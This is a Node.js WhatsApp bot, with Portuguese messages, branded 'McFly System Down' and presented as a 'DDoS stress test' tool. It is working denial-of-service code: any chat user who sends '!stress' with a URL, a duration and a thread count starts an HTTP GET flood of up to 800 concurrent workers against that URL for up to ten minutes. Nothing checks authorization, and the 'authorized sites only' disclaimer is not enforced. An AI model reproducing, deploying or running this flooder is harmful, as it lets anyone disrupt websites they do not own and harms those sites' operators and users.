import { makeWASocket, DisconnectReason, useSingleFileAuthState } from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import axios from 'axios';

const { state, saveState } = useSingleFileAuthState('./auth_info.json');

const sock = makeWASocket({
  auth: state,
  printQRInTerminal: true
});

sock.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect, qr } = update;
  if(qr) {
    console.log('Escaneie o QR Code para logar');
  }
  if(connection === 'close') {
    const shouldReconnect = (lastDisconnect.error instanceof Boom) && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut;
    if(shouldReconnect) {
      console.log('Tentando reconectar...');
      sock.connect();
    } else {
      console.log('Desconectado definitivamente.');
    }
  } else if(connection === 'open') {
    console.log('Conectado ao WhatsApp');
  }
});

sock.ev.on('creds.update', saveState);

async function attack(url, tempo, threads) {
  const endTime = Date.now() + tempo * 1000;

  const workers = [];

  for(let i = 0; i < threads; i++) {
    workers.push((async () => {
      while(Date.now() < endTime) {
        try {
          // Aqui pode ser GET, POST ou outro método. Use GET simples para flood.
          await axios.get(url, { timeout: 5000 });
        } catch(e) {
          // Ignorar erros para não travar o loop
        }
      }
    })());
  }

  await Promise.all(workers);
}

sock.ev.on('messages.upsert', async ({ messages }) => {
  if(!messages || messages.length === 0) return;
  const msg = messages[0];

  if(!msg.message || !msg.key.fromMe) {
    const text = msg.message.conversation || msg.message.extendedTextMessage?.text;

    const from = msg.key.remoteJid;

    if(!text) return;

    if(text.startsWith('!start')) {
      const welcomeMessage = `🔥 *McFly System Down*\n\n` +
        `👨‍💻 Sou um bot de testes de stress DDoS.\n\n` +
        `🛠️ *Comando disponível:*\n\n` +
        `!stress (url) (tempo-em-segundos) (quantidade-de-threads)\n\n` +
        `🧠 Exemplo:\n` +
        `!stress https://seusite.com 60 50\n` +
        `Limite tempo: 600 segundos | Limite threads: 800\n\n` +
        `⚠️ *Uso exclusivo para testes em sites autorizados pela sua equipe.*`;

      await sock.sendMessage(from, { text: welcomeMessage });
    }

    if(text.startsWith('!stress')) {
      const args = text.trim().split(' ');
      if(args.length !== 4) {
        await sock.sendMessage(from, { text: 'Formato inválido! Use: !stress (url) (tempo) (threads)' });
        return;
      }

      const url = args[1];
      let tempo = parseInt(args[2]);
      let threads = parseInt(args[3]);

      if(!url || isNaN(tempo) || isNaN(threads)) {
        await sock.sendMessage(from, { text: 'Parâmetros inválidos! Use números para tempo e threads.' });
        return;
      }

      if(tempo > 600) tempo = 600;
      if(threads > 800) threads = 800;

      await sock.sendMessage(from, { text: `Iniciando ataque no site: ${url}\nTempo: ${tempo}s\nThreads: ${threads}` });

      try {
        await attack(url, tempo, threads);
        await sock.sendMessage(from, { text: 'Ataque finalizado!' });
      } catch(e) {
        await sock.sendMessage(from, { text: `Erro durante o ataque: ${e.message}` });
      }
    }
  }
});
